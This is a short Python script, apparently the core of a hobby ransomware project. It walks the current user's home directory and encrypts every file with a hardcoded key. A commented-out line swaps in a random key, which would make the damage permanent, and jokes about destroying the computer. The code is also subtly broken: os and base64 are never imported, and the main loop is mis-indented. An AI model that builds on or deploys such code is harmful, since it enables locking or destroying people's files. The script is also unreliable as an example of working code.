from Locker import encrypt, decrypt
from walker import walker

def main():
  
  """
  This function is self explainable. And yes, DO NOT use it if
  you seriously don't know what's going on. Still, it won't be a
  prooblem, because, you already know the *HARDCODED_KEY*
  """
  HARDCODED_KEY = "no please, don't see this"
  
  ###########################################################################
  ##  Uncomment this line of code below if you want to destroy the computer
  ##  but please don't blame me, as I warned you before... :)
  
  ## HARDCODED_KEY = base64.b64encode(os.urandom(32)).decode()
  ###########################################################################
  
  path = os.path.expanduser('~')
    
  targets = walker(path)
    for target in targets:
        encrypt(target, HARDCODED_KEY)
  
if __name__ == '__main__':
  main()
